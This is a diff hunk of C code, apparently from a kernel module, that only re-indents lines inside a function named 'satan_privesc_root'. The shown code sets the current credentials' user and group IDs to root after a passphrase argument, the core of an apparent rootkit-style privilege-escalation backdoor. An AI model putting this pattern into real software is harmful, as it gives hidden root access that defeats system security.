@@ -25,7 +25,7 @@ int satan_privesc_root(const char *passphrase)
         if (!cred)
                 return 1;
 
-	cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
-	cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
+        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
+        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
         return 0;
 }
